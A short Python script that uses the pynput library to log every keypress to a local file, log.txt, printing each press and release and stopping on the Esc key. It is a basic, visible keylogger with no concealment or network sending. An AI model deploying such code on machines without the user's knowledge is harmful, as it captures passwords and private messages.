import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)
    
    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # Removing quotes and formatting key names
            k = str(key).replace("'", "")
            if k.find("Key.") != -1:
                # For special keys, keep their name
                f.write(k + " ")
            else:
                f.write(k + " ")  # Adding a space for readability

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

# Starting the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
